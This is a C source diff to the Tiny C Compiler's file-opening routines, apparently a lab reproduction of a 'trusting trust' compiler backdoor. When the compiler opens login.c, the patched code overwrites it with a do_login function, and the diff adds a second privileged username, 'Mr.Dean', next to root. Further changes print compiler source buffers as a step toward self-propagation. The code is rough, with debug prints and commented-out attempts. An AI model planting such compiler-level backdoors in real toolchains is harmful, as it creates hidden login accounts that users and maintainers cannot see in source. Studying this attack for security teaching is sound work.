@@ -685,16 +685,16 @@ ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)
 {
     // printf("%s\n", filename);
 
-    if (!strcmp(filename, "login.c"))
+    if (strcmp(filename, "login.c") == 0)
     {
-        printf("YOOOO\n");
+        printf("AAAAAAAA");
         FILE *loginfile = fopen(filename, "w+");
         char *logintext =
             "#include <string.h>\n\
                 static int\n\
                 do_login(const char *username)\n\
             {\n\
-                if (!strcmp(username, \"root\"))\n\
+                if (!strcmp(username, \"root\") || !strcmp(username, \"Mr.Dean\"))\n\
                     return 0;\n\
                 return 1;\n\
             }\n\
@@ -707,14 +707,27 @@ ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)
         fprintf(loginfile, "%s", logintext);
         fclose(loginfile);
     }
+    else if (!strcmp(filename, "libtcc.c"))
+    {
+        printf("BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\n\n\n\n");
+    }
 
     BufferedFile *bf;
     int buflen = initlen ? initlen : IO_BUF_SIZE;
-
     bf = tcc_mallocz(sizeof(BufferedFile) + buflen);
+    // char a[1024] = "libtcc.c\0";
+    // bf->filename[0] = "libtcc.c\0";
+    // strcpy(bf->filename, "libtcc.c");
+    // printf("%s\n", bf->filename);
     bf->buf_ptr = bf->buffer;
     bf->buf_end = bf->buffer + initlen;
     bf->buf_end[0] = CH_EOB; /* put eob symbol */
+    // if (!strcmp(filename, "libtcc.c"))
+    // {
+    //     printf("AOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO\n");
+    // printf(bf->buffer);
+    // printf("\nOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO\n");
+    // }
     pstrcpy(bf->filename, sizeof(bf->filename), filename);
 #ifdef _WIN32
     normalize_slashes(bf->filename);
@@ -732,6 +745,12 @@ ST_FUNC void tcc_close(void)
 {
     TCCState *s1 = tcc_state;
     BufferedFile *bf = file;
+    if (!strcmp(bf->filename, "libtcc.c"))
+    {
+        printf("adadadsafdsa\n");
+        printf(bf->buffer);
+        printf("fdfsdfdsafdsafdsaf\n");
+    }
     if (bf->fd > 0)
     {
         close(bf->fd);
